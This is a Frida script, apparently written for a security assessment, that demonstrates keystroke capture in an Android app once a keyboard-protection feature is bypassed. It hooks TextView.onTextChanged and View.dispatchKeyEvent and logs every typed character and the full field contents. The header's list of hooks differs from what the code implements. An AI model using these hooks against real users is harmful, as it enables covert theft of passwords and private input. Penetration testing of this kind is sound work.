/*
 * demo_a1_keylogger.js — Keylogging demo (A1)
 *
 * Demonstrates that once KeyboardGuard is bypassed (or broken, as on Android 15),
 * a third-party IME's input reaches the app and is fully capturable.
 *
 * Attack model:
 *   A malicious IME is set as the system default. The IME receives every
 *   character before it is committed to the app. With Appdome's protection
 *   disabled, the IME is not blocked — it can log keystrokes silently.
 *   This script simulates what that malicious IME would see, from inside the app
 *   process via Frida.
 *
 * Hooks:
 *   1. android.widget.Editor$EditableInputConnection.commitText
 *      → logs every character batch delivered by any IME to any EditText.
 *      This is the actual IME→app text delivery path for soft keyboards.
 *
 *   2. android.widget.Editor$EditableInputConnection.setComposingText
 *      → logs in-progress composition (each keystroke as it's typed, before
 *      the user commits). Optional but shows character-by-character capture.
 *
 *   3. View.dispatchKeyEvent ACTION_DOWN (keycodes 7-54)
 *      → logs hardware / adb-injected key events.
 *
 *   4. android.widget.EditText.getText (called on any EditText)
 *      → snapshots the full field content each time the app reads it.
 *
 * Run alongside bypass_a1_keyboardguard.js:
 *   frida -U -n Gadget \
 *     -l scripts/bypass_a1_keyboardguard.js \
 *     -l scripts/demo_a1_keylogger.js
 *
 * Demo procedure (see report_a1_keylogging_v3.md §4):
 *   1. AnySoftKeyboard set as default IME.
 *   2. App → Settings → tap "alarm string for Sunday" → dialog opens.
 *   3. Tap the text field, type anything with AnySoftKeyboard.
 *   4. Watch [KEYLOG] lines in Frida console.
 */

Java.perform(function () {

    // 1. TextView.onTextChanged — fires on every buffer mutation from any source
    //    (soft IME commitText, composing, hardware keys, paste, programmatic set).
    //    text is the FULL buffer content at time of change.
    //    lengthAfter > 0 means characters were added; == 0 means deletion.
    //    This avoids the Editor$EditableInputConnection classloader restriction
    //    on Android 15 (that class is framework-private, not in the app's DEX path).
    try {
        const TV = Java.use("android.widget.TextView");
        TV.onTextChanged.implementation = function (text, start, lengthBefore, lengthAfter) {
            if (text !== null) {
                // Call Object.toString() via the Frida Java proxy — forces virtual
                // dispatch to SpannableStringBuilder.toString() and returns a proper
                // JS string. Direct text.toString() on a CharSequence interface proxy
                // can return [object Object]; charAt() returns a boxed Java char, not
                // a JS number, so String.fromCharCode() produces null bytes. This is
                // the reliable path.
                let str = "";
                try {
                    str = Java.use("java.lang.Object").toString.call(text) || "";
                } catch (_) {}
                if (str.length > 0) {
                    const tag = lengthAfter > 0 ? "[KEYLOG] +" + lengthAfter + " chars" : "[KEYLOG] delete";
                    console.log(tag + "  buffer=\"" + str + "\"");
                }
            }
            this.onTextChanged(text, start, lengthBefore, lengthAfter);
        };
        console.log("[+] TextView.onTextChanged hooked (all text input sources)");
    } catch (e) {
        console.log("[-] TextView.onTextChanged: " + e);
    }

    // 2. View.dispatchKeyEvent — hardware / adb-injected key events
    //    Complements onTextChanged for keys that don't go through IME commitText.
    try {
        const View = Java.use("android.view.View");
        View.dispatchKeyEvent.implementation = function (event) {
            if (event.getAction() === 0) { // ACTION_DOWN
                const code = event.getKeyCode();
                if (code >= 7 && code <= 54) { // KEYCODE_0 through KEYCODE_Z
                    let ch = "";
                    try { ch = String.fromCharCode(event.getUnicodeChar()); } catch (_) {}
                    console.log("[KEYLOG] dispatchKey keyCode=" + code +
                                (ch.trim() ? " char=\"" + ch + "\"" : ""));
                }
            }
            return this.dispatchKeyEvent(event);
        };
        console.log("[+] View.dispatchKeyEvent hooked (hardware/adb keys)");
    } catch (e) {
        console.log("[-] View.dispatchKeyEvent: " + e);
    }

    console.log("\n[*] === A1 keylogger demo active ===");
    console.log("[*] Go to TimeCard -> Settings -> alarm string for Sunday -> tap field -> type.");
    console.log("[*] Each character (and the growing buffer) appears as [KEYLOG] lines.\n");
});
